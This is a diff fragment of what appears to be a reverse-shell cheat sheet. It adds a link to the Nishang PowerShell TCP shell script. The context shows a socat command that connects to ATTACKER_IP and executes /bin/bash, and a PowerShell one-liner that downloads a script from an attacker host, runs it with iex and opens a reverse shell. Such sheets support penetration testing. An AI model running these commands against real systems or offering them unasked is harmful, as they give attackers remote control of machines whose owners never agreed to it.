@@ -125,6 +125,7 @@ socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash
 ---
 
 # 9. PowerShell Reverse Shell (Windows)
+Link: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
 
 ```powershell
 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
